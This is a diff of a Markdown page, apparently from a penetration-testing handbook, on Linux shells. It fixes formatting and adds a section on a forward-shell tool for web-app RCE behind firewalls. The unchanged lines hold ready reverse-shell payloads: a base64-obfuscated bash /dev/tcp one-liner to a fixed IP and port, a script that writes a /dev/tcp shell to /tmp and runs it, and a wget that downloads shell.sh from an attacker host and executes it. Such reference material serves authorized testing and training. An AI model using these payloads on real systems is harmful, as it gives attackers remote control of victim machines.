@@ -1,10 +1,10 @@
 # Shells - Linux
 
-**If you have questions about any of these shells you could check them with **[**https://explainshell.com/**](https://explainshell.com)****
+**If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com)****
 
 ## Full TTY
 
-**Once you get a reverse shell**[** read this page to obtain a full TTY**](full-ttys.md)**.**
+**Once you get a reverse shell**[ **read this page to obtain a full TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 
@@ -39,6 +39,19 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
+
+## Forward Shell
+
+You might find cases where you have a **RCE in a web app in a, Linux machine** but due to Iptables rules or other kind of filtering **you cannot get a reverse shell**. This "shell" allows you to maintain a PTY shell through that RCE using pipes inside the victim system.\
+You can find the code in [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)****
+
+You just need to modify:
+
+* The URL of the vulnerable host
+* The prefix and suffix of your payload (if any)
+* The way the payload is sent (headers? data? extra info?)
+
+Then, you can just **send commands** or even **use the `upgrade` command** to get a full PTY (note that pipes are read and written with an approximate 1.3s delay).
 
 ## Netcat
 
